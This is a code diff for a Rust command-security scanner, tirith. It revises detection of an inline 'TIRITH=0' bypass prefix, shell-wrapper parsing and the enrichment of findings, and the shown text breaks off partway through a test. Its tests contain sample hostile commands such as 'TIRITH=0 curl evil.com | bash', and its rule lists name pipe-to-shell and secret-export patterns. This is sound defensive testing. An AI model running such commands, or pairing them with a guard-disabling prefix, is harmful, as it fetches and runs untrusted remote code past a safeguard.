@@ -30,33 +30,25 @@ pub struct AnalysisContext {
     pub cwd: Option<String>,
     /// File path being scanned (only populated for ScanContext::FileScan).
     pub file_path: Option<std::path::PathBuf>,
+    /// Repository root for config path classification (absolute→relative normalization).
+    /// Only populated for ScanContext::FileScan. When None, configfile checks use
+    /// an empty root (suitable for already-relative paths).
+    pub repo_root: Option<std::path::PathBuf>,
+    /// Override config file classification. When true, the file is treated as a known
+    /// config file regardless of path-based matching. Used for probe-found files inside
+    /// excluded trees (vendor/, node_modules/) where the probe already verified the
+    /// directory identity but the file's repo-relative path doesn't root-anchor.
+    pub is_config_override: bool,
     /// Clipboard HTML content for rich-text paste analysis.
     /// Only populated when `tirith paste --html <path>` is used.
     pub clipboard_html: Option<String>,
 }
 
-/// Check if a word is `TIRITH=0` with optional quotes around the value.
-/// `split_raw_words` preserves quotes, so we need to match `TIRITH='0'` and
-/// `TIRITH="0"` in addition to the bare `TIRITH=0`.
-fn is_tirith_bypass_assignment(word: &str) -> bool {
-    if let Some(val) = word.strip_prefix("TIRITH=") {
-        let stripped = if val.len() >= 2
-            && ((val.starts_with('"') && val.ends_with('"'))
-                || (val.starts_with('\'') && val.ends_with('\'')))
-        {
-            &val[1..val.len() - 1]
-        } else {
-            val
-        };
-        stripped == "0"
-    } else {
-        false
-    }
-}
-
 /// Check if the input contains an inline `TIRITH=0` bypass prefix.
-/// Handles bare prefix (`TIRITH=0 cmd`) and env wrappers (`env -i TIRITH=0 cmd`).
-fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
+/// Handles POSIX bare prefix (`TIRITH=0 cmd`), env wrappers (`env -i TIRITH=0 cmd`),
+/// and PowerShell env syntax (`$env:TIRITH="0"; cmd`).
+/// Requires a real command word after the bypass — `TIRITH=0;` alone is not honored.
+fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     use crate::tokenize;
 
     let words = split_raw_words(input);
@@ -64,20 +56,34 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
         return false;
     }
 
+    // POSIX / Fish: VAR=VALUE prefix or env wrapper
+    // (Fish 3.1+ and all POSIX shells support `TIRITH=0 command`)
+
     // Case 1: Leading VAR=VALUE assignments before the command
     let mut idx = 0;
+    let mut found_tirith = false;
     while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
         if is_tirith_bypass_assignment(&words[idx]) {
-            return true;
+            found_tirith = true;
         }
         idx += 1;
     }
+    // Only honor bypass if a real command follows in the same segment
+    if found_tirith && idx < words.len() {
+        return true;
+    }
 
     // Case 2: First real word is `env` — parse env-style args
+    // Reset: skip any leading non-TIRITH assignments to reach the `env` command
+    idx = 0;
+    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
+        idx += 1;
+    }
     if idx < words.len() {
-        let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
+        let cmd = strip_surrounding_quotes(words[idx].rsplit('/').next().unwrap_or(&words[idx]));
         if cmd == "env" {
             idx += 1;
+            found_tirith = false;
             while idx < words.len() {
                 let w = &words[idx];
                 if w == "--" {
@@ -87,14 +93,15 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
                 }
                 if tokenize::is_env_assignment(w) {
                     if is_tirith_bypass_assignment(w) {
-                        return true;
+                        found_tirith = true;
                     }
                     idx += 1;
                     continue;
                 }
                 if w.starts_with('-') {
-                    if w == "-u" || w == "-C" || w == "-S" {
-                        idx += 2; // skip option and its value arg
+                    // -u takes a value arg
+                    if w == "-u" {
+                        idx += 2; // skip -u and its value
                         continue;
                     }
                     idx += 1;
@@ -106,14 +113,96 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
             // Check remaining words after -- for TIRITH=0
             while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
                 if is_tirith_bypass_assignment(&words[idx]) {
-                    return true;
+                    found_tirith = true;
                 }
                 idx += 1;
+            }
+            // Only honor bypass if env has a command to run
+            if found_tirith && idx < words.len() {
+                return true;
+            }
+        }
+    }
+
+    // PowerShell: $env:TIRITH="0" or $env:TIRITH = "0" (before first ;)
+    if shell == ShellType::PowerShell {
+        for word in &words {
+            if is_powershell_tirith_bypass(word) {
+                return true;
+            }
+        }
+        // Multi-word: $env:TIRITH = "0" (space around =)
+        if words.len() >= 3 {
+            for window in words.windows(3) {
+                if is_powershell_env_ref(&window[0], "TIRITH")
+                    && window[1] == "="
+                    && strip_surrounding_quotes(&window[2]) == "0"
+                {
+                    return true;
+                }
             }
         }
     }
 
     false
+}
+
+/// Check if a word is a `TIRITH=0` assignment, handling optional quotes around the value.
+/// `split_raw_words` preserves quote chars, so we may see `TIRITH='0'` or `TIRITH="0"`.
+fn is_tirith_bypass_assignment(word: &str) -> bool {
+    if let Some(eq_pos) = word.find('=') {
+        let name = &word[..eq_pos];
+        if name != "TIRITH" {
+            return false;
+        }
+        let value = &word[eq_pos + 1..];
+        strip_surrounding_quotes(value) == "0"
+    } else {
+        false
+    }
+}
+
+/// Check if a word is `$env:TIRITH=0` with optional quotes around the value.
+/// The `$env:` prefix is matched case-insensitively (PowerShell convention).
+fn is_powershell_tirith_bypass(word: &str) -> bool {
+    if !word.starts_with('$') || word.len() < "$env:TIRITH=0".len() {
+        return false;
+    }
+    let after_dollar = &word[1..];
+    let prefix = "env:";
+    let after_env = match after_dollar.get(..prefix.len()) {
+        Some(s) if s.eq_ignore_ascii_case(prefix) => &after_dollar[prefix.len()..],
+        _ => return false,
+    };
+    let value = match after_env.strip_prefix("TIRITH=") {
+        Some(v) => v,
+        None => return false,
+    };
+    strip_surrounding_quotes(value) == "0"
+}
+
+/// Check if a word is a PowerShell env var reference `$env:VARNAME` (no assignment).
+fn is_powershell_env_ref(word: &str, var_name: &str) -> bool {
+    if !word.starts_with('$') {
+        return false;
+    }
+    let after_dollar = &word[1..];
+    let prefix = "env:";
+    after_dollar
+        .get(..prefix.len())
+        .is_some_and(|s| s.eq_ignore_ascii_case(prefix))
+        && (after_dollar.get(prefix.len()..) == Some(var_name))
+}
+
+/// Strip a single layer of matching quotes (single or double) from a string.
+fn strip_surrounding_quotes(s: &str) -> &str {
+    if s.len() >= 2
+        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
+    {
+        &s[1..s.len() - 1]
+    } else {
+        s
+    }
 }
 
 /// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
@@ -215,7 +304,7 @@ fn is_self_invocation(input: &str, shell: ShellType) -> bool {
     }
 
     let cmd = &words[idx];
-    let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd);
+    let cmd_base = strip_surrounding_quotes(cmd.rsplit('/').next().unwrap_or(cmd));
 
     // Try to resolve wrappers (one level)
     let resolved = match cmd_base {
@@ -246,8 +335,8 @@ fn resolve_env_wrapper(args: &[String]) -> Option<String> {
             continue;
         }
         if w.starts_with('-') {
-            if w == "-u" || w == "-C" || w == "-S" {
-                i += 2; // skip option and its value arg
+            if w == "-u" {
+                i += 2; // skip -u and its value
                 continue;
             }
             i += 1;
@@ -268,12 +357,20 @@ fn resolve_env_wrapper(args: &[String]) -> Option<String> {
     None
 }
 
-/// Resolve through `command` wrapper: skip flags like -v, -p, -V, then `--`, take next arg.
+/// Resolve through `command` wrapper: skip flags, then `--`, take next arg.
+/// Returns None for `command -v` / `command -V` which only look up commands, not execute them.
 fn resolve_command_wrapper(args: &[String]) -> Option<String> {
     let mut i = 0;
-    // Skip flags like -v, -p, -V
+    let mut is_lookup = false;
+    // Parse flags; -v and -V are lookup-only (print path/version, no execution)
     while i < args.len() && args[i].starts_with('-') && args[i] != "--" {
+        if args[i] == "-v" || args[i] == "-V" {
+            is_lookup = true;
+        }
         i += 1;
+    }
+    if is_lookup {
+        return None;
     }
     // Skip -- if present
     if i < args.len() && args[i] == "--" {
@@ -287,21 +384,41 @@ fn resolve_command_wrapper(args: &[String]) -> Option<String> {
     }
 }
 
-/// Resolve through `time` wrapper: skip -prefixed flags, take next non-flag.
+/// Resolve through `time` wrapper: skip flags (including `-f`/`-o` which take a separate arg).
 fn resolve_time_wrapper(args: &[String]) -> Option<String> {
-    for w in args {
+    let mut i = 0;
+    while i < args.len() {
+        let w = &args[i];
+        if w == "--" {
+            i += 1;
+            break;
+        }
         if w.starts_with('-') {
+            // GNU time flags that consume the next argument
+            if w == "-f" || w == "--format" || w == "-o" || w == "--output" {
+                i += 2;
+            } else if w.starts_with("--") && w.contains('=') {
+                // --format=FMT, --output=FILE — single token
+                i += 1;
+            } else {
+                i += 1;
+            }
             continue;
         }
+        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
+    }
+    // After --, first arg is the command
+    if i < args.len() {
+        let w = &args[i];
         return Some(w.rsplit('/').next().unwrap_or(w).to_string());
     }
     None
 }
 
 /// Check if a command name is tirith (literal match).
-/// Note: callers already strip path prefixes via rsplit('/'), so only basename arrives here.
+/// Strips surrounding quotes since split_raw_words preserves them.
 fn is_tirith_command(cmd: &str) -> bool {
-    cmd == "tirith"
+    strip_surrounding_quotes(cmd) == "tirith"
 }
 
 /// Run the tiered analysis pipeline.
@@ -326,11 +443,11 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
                 || scan.has_control_chars
                 || scan.has_bidi_controls
                 || scan.has_zero_width
-                || scan.has_invalid_utf8
                 || scan.has_unicode_tags
                 || scan.has_variation_selectors
                 || scan.has_invisible_math_operators
                 || scan.has_invisible_whitespace
+                || scan.has_invalid_utf8
         } else {
             false
         }
@@ -448,11 +565,12 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
         findings.extend(crate::rules::configfile::check(
             &ctx.input,
             ctx.file_path.as_deref(),
+            ctx.repo_root.as_deref(),
+            ctx.is_config_override,
         ));
 
         // Rendered content rules (file-type gated)
         if crate::rules::rendered::is_renderable_file(ctx.file_path.as_deref()) {
-            // PDF files get their own parser
             let is_pdf = ctx
                 .file_path
                 .as_deref()
@@ -471,87 +589,84 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
                 ));
             }
         }
-    } else {
-        // Exec/Paste: standard pipeline
-
-        // Run byte-level rules for paste context
-        if ctx.scan_context == ScanContext::Paste {
-            if let Some(ref bytes) = ctx.raw_bytes {
-                let byte_findings = crate::rules::terminal::check_bytes(bytes);
-                findings.extend(byte_findings);
-            }
-            // Check for hidden multiline content in pasted text
-            let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
-            findings.extend(multiline_findings);
-
-            // Check clipboard HTML for hidden content (rich-text paste analysis)
-            if let Some(ref html) = ctx.clipboard_html {
-                let clipboard_findings =
-                    crate::rules::terminal::check_clipboard_html(html, &ctx.input);
-                findings.extend(clipboard_findings);
-            }
+    } else if ctx.scan_context == ScanContext::Paste {
+        if let Some(ref bytes) = ctx.raw_bytes {
+            let byte_findings = crate::rules::terminal::check_bytes(bytes);
+            findings.extend(byte_findings);
         }
+        // Check for hidden multiline content in pasted text
+        let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
+        findings.extend(multiline_findings);
 
-        // Invisible character checks apply to both exec and paste contexts
-        if ctx.scan_context == ScanContext::Exec {
-            let byte_input = ctx.input.as_bytes();
-            let scan = extract::scan_bytes(byte_input);
-            if scan.has_bidi_controls
-                || scan.has_zero_width
-                || scan.has_unicode_tags
-                || scan.has_variation_selectors
-                || scan.has_invisible_math_operators
-                || scan.has_invisible_whitespace
-            {
-                let byte_findings = crate::rules::terminal::check_bytes(byte_input);
-                // Only keep invisible-char findings for exec context
-                findings.extend(byte_findings.into_iter().filter(|f| {
-                    matches!(
-                        f.rule_id,
-                        crate::verdict::RuleId::BidiControls
-                            | crate::verdict::RuleId::ZeroWidthChars
-                            | crate::verdict::RuleId::UnicodeTags
-                            | crate::verdict::RuleId::InvisibleMathOperator
-                            | crate::verdict::RuleId::VariationSelector
-                            | crate::verdict::RuleId::InvisibleWhitespace
-                    )
-                }));
-            }
+        // Check clipboard HTML for hidden content (rich-text paste analysis)
+        if let Some(ref html) = ctx.clipboard_html {
+            let clipboard_findings = crate::rules::terminal::check_clipboard_html(html, &ctx.input);
+            findings.extend(clipboard_findings);
         }
+    }
 
-        // Extract and analyze URLs
+    // Invisible character checks apply to both exec and paste contexts
+    if ctx.scan_context == ScanContext::Exec {
+        let byte_input = ctx.input.as_bytes();
+        let scan = extract::scan_bytes(byte_input);
+        if scan.has_bidi_controls
+            || scan.has_zero_width
+            || scan.has_unicode_tags
+            || scan.has_variation_selectors
+            || scan.has_invisible_math_operators
+            || scan.has_invisible_whitespace
+        {
+            let byte_findings = crate::rules::terminal::check_bytes(byte_input);
+            // Only keep invisible-char findings for exec context
+            findings.extend(byte_findings.into_iter().filter(|f| {
+                matches!(
+                    f.rule_id,
+                    crate::verdict::RuleId::BidiControls
+                        | crate::verdict::RuleId::ZeroWidthChars
+                        | crate::verdict::RuleId::UnicodeTags
+                        | crate::verdict::RuleId::InvisibleMathOperator
+                        | crate::verdict::RuleId::VariationSelector
+                        | crate::verdict::RuleId::InvisibleWhitespace
+                )
+            }));
+        }
+    }
+
+    // Extract and analyze URLs (exec/paste only, not file scan)
+    if ctx.scan_context != ScanContext::FileScan {
         extracted = extract::extract_urls(&ctx.input, ctx.shell);
+    }
 
-        for url_info in &extracted {
-            // Normalize path if available — use raw extracted URL's path for non-ASCII detection
-            // since url::Url percent-encodes non-ASCII during parsing
-            let raw_path = extract_raw_path_from_url(&url_info.raw);
-            let normalized_path = url_info.parsed.path().map(normalize::normalize_path);
+    for url_info in &extracted {
+        // Normalize path if available — use raw extracted URL's path for non-ASCII detection
+        // since url::Url percent-encodes non-ASCII during parsing
+        let raw_path = extract_raw_path_from_url(&url_info.raw);
+        let normalized_path = url_info.parsed.path().map(normalize::normalize_path);
 
-            // Run all rule categories
-            let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
-            findings.extend(hostname_findings);
+        // Run all rule categories
+        let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
+        findings.extend(hostname_findings);
 
-            let path_findings = crate::rules::path::check(
-                &url_info.parsed,
-                normalized_path.as_ref(),
-                raw_path.as_deref(),
-            );
-            findings.extend(path_findings);
+        let path_findings = crate::rules::path::check(
+            &url_info.parsed,
+            normalized_path.as_ref(),
+            raw_path.as_deref(),
+        );
+        findings.extend(path_findings);
 
-            let transport_findings =
-                crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
-            findings.extend(transport_findings);
+        let transport_findings =
+            crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
+        findings.extend(transport_findings);
 
-            let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
-            findings.extend(ecosystem_findings);
-        }
+        let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
+        findings.extend(ecosystem_findings);
+    }
 
-        // Run command-shape rules on full input
+    // Run command-shape and environment rules (exec/paste only)
+    if ctx.scan_context != ScanContext::FileScan {
         let command_findings = crate::rules::command::check(&ctx.input, ctx.shell);
         findings.extend(command_findings);
 
-        // Run environment rules
         let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
         findings.extend(env_findings);
     }
@@ -577,6 +692,8 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
                 }],
                 human_view: None,
                 agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
             });
         }
     }
@@ -645,13 +762,8 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
     verdict
 }
 
-// ---------------------------------------------------------------------------
-// Paranoia tier filtering (Phase 15)
-// ---------------------------------------------------------------------------
-
-/// Filter a verdict's findings by paranoia level and license tier.
+/// Filter findings by paranoia level and license tier.
 ///
-/// This is an output-layer filter — the engine always detects everything (ADR-13).
 /// CLI/MCP call this after `analyze()` to reduce noise at lower paranoia levels.
 ///
 /// - Paranoia 1-2 (any tier): Medium+ findings only
@@ -708,15 +820,15 @@ pub fn filter_findings_by_paranoia_vec(findings: &mut Vec<Finding>, paranoia: u8
 }
 
 // ---------------------------------------------------------------------------
-// Tier-gated enrichment (ADR-13: detect free, enrich paid)
+// Enrichment functions (ADR-13)
 // ---------------------------------------------------------------------------
 
-/// Sanitize view text by escaping control characters to bracketed notation.
+/// Sanitize view text: escape invisible/control characters, truncate long strings.
 ///
-/// Encoding:
-///   literal `[` → `[LBRACK]`
+/// Mapping:
+///   `[` → `[LBRACK]` (prevents marker injection)
 ///   ESC (0x1B) → `[ESC]`
-///   Bidi (U+202A..U+202E, U+2066..U+2069) → `[U+XXXX]`
+///   Bidi controls (U+202A..U+202E, U+2066..U+2069) → `[U+XXXX]`
 ///   Zero-width (U+200B..U+200F, U+FEFF) → `[U+XXXX]`
 ///   Unicode Tags (U+E0001..U+E007F) → `[U+XXXXX]`
 ///   Control chars (0x00..0x1F except \n\r\t, 0x7F) → `[0xHH]`
@@ -725,11 +837,8 @@ pub fn filter_findings_by_paranoia_vec(findings: &mut Vec<Finding>, paranoia: u8
 /// Truncates to 512 bytes with `... [truncated, {N} bytes]` marker.
 /// Trims incomplete markers (opening `[` without closing `]`) at truncation boundary.
 fn sanitize_view(s: &str) -> String {
-    // Total output cap including truncation marker. The marker itself is
-    // at most ~30 bytes ("... [truncated, 999999 bytes]"), so we reserve
-    // space for it to ensure the final output never exceeds MAX_BYTES.
     const MAX_BYTES: usize = 512;
-    const MARKER_RESERVE: usize = 50; // enough for "... [truncated, {N} bytes sanitized]"
+    const MARKER_RESERVE: usize = 50;
     let total = s.len();
     let full_len = sanitize_view_full_len(s);
     let needs_truncation = full_len > MAX_BYTES;
@@ -759,7 +868,6 @@ fn sanitize_view(s: &str) -> String {
             }
             '\x7F' => "[0x7F]".to_string(),
             c => {
-                // Verbatim — check length before appending
                 if out.len() + c.len_utf8() > content_cap {
                     break;
                 }
@@ -774,11 +882,7 @@ fn sanitize_view(s: &str) -> String {
         out.push_str(&escaped);
     }
 
-    // If we truncated (didn't consume all chars), add marker
     if needs_truncation {
-        // Defensive: trim any incomplete bracket marker at the end.
-        // Current logic appends escaped sequences atomically, so this
-        // shouldn't trigger — but guards against future refactors.
         if let Some(last_open) = out.rfind('[') {
             if !out[last_open..].contains(']') {
                 out.truncate(last_open);
@@ -811,15 +915,13 @@ fn sanitize_view_full_len(s: &str) -> usize {
 /// Returns `true` if the given rule is enriched with human_view/agent_view in `enrich_pro`.
 ///
 /// Uses an EXHAUSTIVE match — adding a new RuleId variant without listing it
-/// here is a **compile error**, not just a test failure. Every variant must be
-/// explicitly classified as enriched or not. No wildcard (`_ =>`) allowed.
+/// here is a **compile error**, not just a test failure.
 #[cfg(test)]
 #[deny(unreachable_patterns)]
 fn classify_rule_enriched(rule_id: crate::verdict::RuleId) -> bool {
     use crate::verdict::RuleId::*;
     match rule_id {
         // === ENRICHED (must have human_view/agent_view) ===
-        // Rendered content (existing 7)
         HiddenCssContent
         | HiddenColorContent
         | HiddenHtmlAttribute
@@ -827,7 +929,6 @@ fn classify_rule_enriched(rule_id: crate::verdict::RuleId) -> bool {
         | MarkdownComment
         | PdfHiddenText
         | ClipboardHidden
-        // Terminal (7)
         | UnicodeTags
         | ZeroWidthChars
         | BidiControls
@@ -835,47 +936,60 @@ fn classify_rule_enriched(rule_id: crate::verdict::RuleId) -> bool {
         | VariationSelector
         | ControlChars
         | AnsiEscapes
-        // Config (3)
         | ConfigInjection
         | ConfigInvisibleUnicode
         | ConfigNonAscii
-        // MCP (2)
         | McpSuspiciousArgs
         | McpInsecureServer
-        // Cloaking (1)
         | ServerCloaking => true,
 
-        // === NON-ENRICHED (detection-only, no view gap) ===
-        // Every non-enriched variant is listed explicitly here.
-        // Adding a new variant WITHOUT listing it is a compile error.
-        // Hostname
-        NonAsciiHostname | PunycodeDomain | MixedScriptInLabel
-        | UserinfoTrick | ConfusableDomain | RawIpUrl
-        | NonStandardPort | InvalidHostChars | TrailingDotWhitespace
+        // === NON-ENRICHED ===
+        NonAsciiHostname
+        | PunycodeDomain
+        | MixedScriptInLabel
+        | UserinfoTrick
+        | ConfusableDomain
+        | RawIpUrl
+        | NonStandardPort
+        | InvalidHostChars
+        | TrailingDotWhitespace
         | LookalikeTld
-        // Path
-        | NonAsciiPath | HomoglyphInPath | DoubleEncoding
-        // Transport
-        | PlainHttpToSink | SchemelessToSink | InsecureTlsFlags
+        | NonAsciiPath
+        | HomoglyphInPath
+        | DoubleEncoding
+        | PlainHttpToSink
+        | SchemelessToSink
+        | InsecureTlsFlags
         | ShortenedUrl
-        // Terminal (non-enriched subset)
-        | HiddenMultiline | InvisibleWhitespace
-        // Command shape
-        | PipeToInterpreter | CurlPipeShell | WgetPipeShell
-        | HttpiePipeShell | XhPipeShell | DotfileOverwrite
+        | HiddenMultiline
+        | InvisibleWhitespace
+        | PipeToInterpreter
+        | CurlPipeShell
+        | WgetPipeShell
+        | HttpiePipeShell
+        | XhPipeShell
+        | DotfileOverwrite
         | ArchiveExtract
-        // Environment
-        | ProxyEnvSet | SensitiveEnvExport | CodeInjectionEnv
-        | InterpreterHijackEnv | ShellInjectionEnv
-        // Network destination
-        | MetadataEndpoint | PrivateNetworkAccess | CommandNetworkDeny
-        // Config (non-enriched subset)
-        | McpUntrustedServer | McpDuplicateServerName | McpOverlyPermissive
-        // Ecosystem
-        | GitTyposquat | DockerUntrustedRegistry | PipUrlInstall
-        | NpmUrlInstall | Web3RpcEndpoint | Web3AddressInUrl
-        // Policy, License
-        | PolicyBlocklisted | LicenseRequired => false,
+        | ProxyEnvSet
+        | SensitiveEnvExport
+        | CodeInjectionEnv
+        | InterpreterHijackEnv
+        | ShellInjectionEnv
+        | MetadataEndpoint
+        | PrivateNetworkAccess
+        | CommandNetworkDeny
+        | ConfigSuspiciousIndicator
+        | McpUntrustedServer
+        | McpDuplicateServerName
+        | McpOverlyPermissive
+        | GitTyposquat
+        | DockerUntrustedRegistry
+        | PipUrlInstall
+        | NpmUrlInstall
+        | Web3RpcEndpoint
+        | Web3AddressInUrl
+        | PolicyBlocklisted
+        | LicenseRequired => false,
     }
 }
 
@@ -885,7 +999,6 @@ fn enrich_pro(findings: &mut [Finding]) {
 
     for finding in findings.iter_mut() {
         match finding.rule_id {
-            // ── Rendered content (existing 7) ──────────────────────────
             RuleId::HiddenCssContent => {
                 finding.human_view =
                     Some("Content hidden via CSS — invisible in rendered view".into());
@@ -939,8 +1052,6 @@ fn enrich_pro(findings: &mut [Finding]) {
                     evidence_summary(&finding.evidence)
                 ));
             }
-
-            // ── Terminal (7 new) ───────────────────────────────────────
             RuleId::UnicodeTags => {
                 finding.human_view = Some("Invisible — tags render as zero-width".into());
                 finding.agent_view = Some(format!(
@@ -992,8 +1103,6 @@ fn enrich_pro(findings: &mut [Finding]) {
                     evidence_summary(&finding.evidence)
                 ));
             }
-
-            // ── Config (3 new) ─────────────────────────────────────────
             RuleId::ConfigInjection => {
                 finding.human_view = Some("Injection blends with legitimate instructions".into());
                 finding.agent_view = Some(format!(
@@ -1016,8 +1125,6 @@ fn enrich_pro(findings: &mut [Finding]) {
                     evidence_summary(&finding.evidence)
                 ));
             }
-
-            // ── MCP (2 new) ───────────────────────────────────────────
             RuleId::McpSuspiciousArgs => {
                 finding.human_view =
                     Some("Shell metacharacters may be overlooked in JSON config".into());
@@ -1034,8 +1141,6 @@ fn enrich_pro(findings: &mut [Finding]) {
                     evidence_summary(&finding.evidence)
                 ));
             }
-
-            // ── Cloaking (1 new) ──────────────────────────────────────
             RuleId::ServerCloaking => {
                 finding.human_view = Some("Browser shows benign content to human visitors".into());
                 finding.agent_view = Some(format!(
@@ -1043,8 +1148,7 @@ fn enrich_pro(findings: &mut [Finding]) {
                     evidence_summary(&finding.evidence)
                 ));
             }
-
-            // ── Non-enriched variants (explicit for compile-time safety) ──
+            // Non-enriched variants
             RuleId::NonAsciiHostname
             | RuleId::PunycodeDomain
             | RuleId::MixedScriptInLabel
@@ -1079,6 +1183,7 @@ fn enrich_pro(findings: &mut [Finding]) {
             | RuleId::MetadataEndpoint
             | RuleId::PrivateNetworkAccess
             | RuleId::CommandNetworkDeny
+            | RuleId::ConfigSuspiciousIndicator
             | RuleId::McpUntrustedServer
             | RuleId::McpDuplicateServerName
             | RuleId::McpOverlyPermissive
@@ -1125,7 +1230,6 @@ fn evidence_summary(evidence: &[crate::verdict::Evidence]) -> String {
 }
 
 /// Team enrichment: MITRE ATT&CK classification, custom rule metadata.
-/// Populated in Part 9 when Team features ship.
 #[allow(unused_variables)]
 fn enrich_team(findings: &mut [Finding]) {
     // Part 9 will populate:
@@ -1147,6 +1251,8 @@ mod tests {
             interactive: true,
             cwd: None,
             file_path: None,
+            repo_root: None,
+            is_config_override: false,
             clipboard_html: None,
         };
         let verdict = analyze(&ctx);
@@ -1167,68 +1273,6 @@ mod tests {
     }
 
     #[test]
-    fn test_paranoia_filter_suppresses_info_low() {
-        use crate::verdict::{Finding, RuleId, Severity, Timings, Verdict};
-
-        let findings = vec![
-            Finding {
-                rule_id: RuleId::VariationSelector,
-                severity: Severity::Info,
-                title: "info finding".into(),
-                description: String::new(),
-                evidence: vec![],
-                human_view: None,
-                agent_view: None,
-            },
-            Finding {
-                rule_id: RuleId::InvisibleWhitespace,
-                severity: Severity::Low,
-                title: "low finding".into(),
-                description: String::new(),
-                evidence: vec![],
-                human_view: None,
-                agent_view: None,
-            },
-            Finding {
-                rule_id: RuleId::HiddenCssContent,
-                severity: Severity::High,
-                title: "high finding".into(),
-                description: String::new(),
-                evidence: vec![],
-                human_view: None,
-                agent_view: None,
-            },
-        ];
-
-        let timings = Timings {
-            tier0_ms: 0.0,
-            tier1_ms: 0.0,
-            tier2_ms: None,
-            tier3_ms: None,
-            total_ms: 0.0,
-        };
-
-        // Default paranoia (1): only Medium+ shown
-        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
-        filter_findings_by_paranoia(&mut verdict, 1);
-        assert_eq!(
-            verdict.findings.len(),
-            1,
-            "paranoia 1 should keep only High+"
-        );
-        assert_eq!(verdict.findings[0].severity, Severity::High);
-
-        // Paranoia 2: still only Medium+ (free tier cap)
-        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
-        filter_findings_by_paranoia(&mut verdict, 2);
-        assert_eq!(
-            verdict.findings.len(),
-            1,
-            "paranoia 2 should keep only Medium+"
-        );
-    }
-
-    #[test]
     fn test_inline_bypass_bare_prefix() {
         assert!(find_inline_bypass(
             "TIRITH=0 curl evil.com | bash",
@@ -1237,11 +1281,54 @@ mod tests {
     }
 
     #[test]
+    fn test_inline_bypass_quoted_single() {
+        // TIRITH='0' should be recognized (split_raw_words preserves quotes)
+        assert!(find_inline_bypass(
+            "TIRITH='0' curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_quoted_double() {
+        assert!(find_inline_bypass(
+            "TIRITH=\"0\" curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_no_command() {
+        // TIRITH=0 alone (no command) should NOT be treated as bypass
+        assert!(!find_inline_bypass("TIRITH=0", ShellType::Posix));
+    }
+
+    #[test]
+    fn test_inline_bypass_semicolon_no_command() {
+        // TIRITH=0; (semicolon but no command in segment) should NOT bypass
+        assert!(!find_inline_bypass("TIRITH=0;", ShellType::Posix));
+    }
+
+    #[test]
     fn test_inline_bypass_env_wrapper() {
         assert!(find_inline_bypass(
             "env TIRITH=0 curl evil.com",
             ShellType::Posix
         ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_quoted() {
+        assert!(find_inline_bypass(
+            "env TIRITH='0' curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_no_command() {
+        // env TIRITH=0 (no command for env to run) should NOT bypass
+        assert!(!find_inline_bypass("env TIRITH=0", ShellType::Posix));
     }
 
     #[test]
@@ -1277,33 +1364,83 @@ mod tests {
     }
 
     #[test]
-    fn test_inline_bypass_single_quoted_value() {
-        assert!(find_inline_bypass(
-            "TIRITH='0' curl evil.com | bash",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_inline_bypass_double_quoted_value() {
-        assert!(find_inline_bypass(
-            "TIRITH=\"0\" curl evil.com | bash",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_inline_bypass_env_quoted_value() {
-        assert!(find_inline_bypass(
-            "env TIRITH='0' curl evil.com",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
     fn test_no_inline_bypass() {
         assert!(!find_inline_bypass(
             "curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_wrong_value_quoted() {
+        // TIRITH='1' should NOT be a bypass
+        assert!(!find_inline_bypass(
+            "TIRITH='1' curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env_no_quotes() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH=0; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env_single_quotes() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH='0'; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env_spaced() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH = \"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_mixed_case_env() {
+        assert!(find_inline_bypass(
+            "$Env:TIRITH=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
